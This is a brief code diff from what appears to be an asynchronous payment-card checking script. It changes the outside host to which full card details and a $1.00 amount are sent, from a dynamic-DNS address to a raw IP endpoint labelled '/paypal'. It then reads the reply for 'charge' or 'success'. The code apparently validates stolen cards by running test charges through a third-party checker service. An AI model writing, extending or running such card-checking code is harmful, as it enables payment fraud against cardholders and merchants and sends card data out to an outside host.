@@ -87,7 +87,7 @@ params = {"url": gate, "card": card_full, "amount": 1.00}
 async with api_semaphore:
 try:
 async with httpx.AsyncClient(timeout=20) as client:
-r = await client.get("http://gatescheck.duckdns.org:5000/check", params=params)
+r = await client.get("http://151.247.197.54:5500/paypal", params=params)
 result_raw = r.json().get('result','')
 result = result_raw.lower()
 if "charge" in result or "success" in result:
